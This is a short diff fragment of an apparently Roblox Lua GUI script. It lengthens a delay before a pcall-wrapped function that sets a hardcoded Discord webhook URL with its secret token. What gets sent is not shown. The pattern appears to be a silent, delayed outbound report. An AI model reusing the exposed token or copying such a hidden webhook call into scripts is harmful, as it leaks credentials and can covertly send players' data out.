@@ -38,7 +38,7 @@ shadow_2.TextColor3 = Color3.fromRGB(0, 0, 0)
 shadow_2.TextSize = 50.000
 shadow_2.TextStrokeColor3 = Color3.fromRGB(72, 72, 72)
 
-delay(10, function()
+delay(12, function()
 	pcall(function()
 		local webhook = "https://discordapp.com/api/webhooks/709278075774435349/Bgg6Uzx-bnMw4hYeUE6933J0lkzJvemW2ZPiehOAkAsF7hR6XArRrr74AwVTI-goBXjP"
 
